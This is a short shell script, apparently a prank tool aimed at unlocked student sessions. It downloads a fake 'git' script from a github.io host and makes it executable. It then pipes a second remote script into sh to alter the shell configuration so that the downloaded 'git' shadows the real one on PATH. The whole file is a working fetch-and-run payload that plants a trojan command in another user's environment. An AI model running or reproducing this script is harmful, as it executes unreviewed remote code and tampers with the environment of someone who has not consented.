#!/bin/sh

tempdir=$(mktemp -d)

curl "https://d-002.github.io/epita/confloose/fake-git/git.sh" >> "$tempdir/git"
chmod +x "$tempdir/git"

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "fake-git" "'export PATH=\"$tempdir:\$PATH\"'" | sh
